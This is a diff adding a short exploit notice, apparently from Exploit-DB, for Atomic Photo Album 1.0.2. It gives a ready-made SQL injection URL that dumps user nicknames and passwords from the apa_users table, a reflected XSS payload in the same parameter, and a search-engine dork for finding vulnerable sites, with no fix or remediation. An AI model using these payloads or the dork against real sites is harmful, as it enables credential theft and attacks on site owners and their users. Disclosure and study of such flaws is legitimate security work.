@@ -1,0 +1,10 @@
+[~] Atomic Photo Album 1.0.2 (SQL/XSS) Multiple Remote Vulnerabilities
+[~] http://www.exploit-db.com/exploits/6572/
+[~] Found by sh00t0ut
+[~] Down: http://www.c-point.com/free_php_scripts/photo_album.php
+[~] Expl SQL: 
+    http://[victim]/photo.php?apa_album_ID=2&apa_photo_ID=-9999 union all select 1,concat(0x3a,nickname,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from apa_users--
+[~] Expl XSS: 
+    http://[victim]/photo.php?apa_album_ID=2&apa_photo_ID=<script>alert(1)</script>
+
+[~] Dork: "Powered by Atomic Photo Album" inurl:"photo.php?apa_album_ID="
